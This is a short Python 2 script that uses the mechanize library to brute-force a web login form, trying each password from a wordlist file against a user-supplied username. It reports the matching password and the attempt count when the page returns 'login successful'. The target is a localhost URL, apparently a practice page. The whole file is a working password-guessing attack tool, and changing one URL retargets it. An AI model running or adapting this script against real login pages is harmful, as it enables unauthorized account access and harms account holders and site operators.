import mechanize

b = mechanize.Browser()

url="http://localhost/php_helloworld/login.php"
wordlist = "joshua2.txt"

try:
    wordlist = open(wordlist,"r")
except:
    print "\n File not found!"
    quit()

username = raw_input("Type in username: ")
count = 0

for password in wordlist:

    response = b.open(url)
    b.select_form(nr=0)

    b.form['username'] = username.strip()
    b.form['password'] = password.strip()
    b.method = "POST"
    response = b.submit()
    string = response.read()
    if (string == "login successful"):
        print string + ", the password is " + password + "\n no. of attempt: ",count
        break
    else:
        count = count +1
        print string + " (attempt ", count, ")"
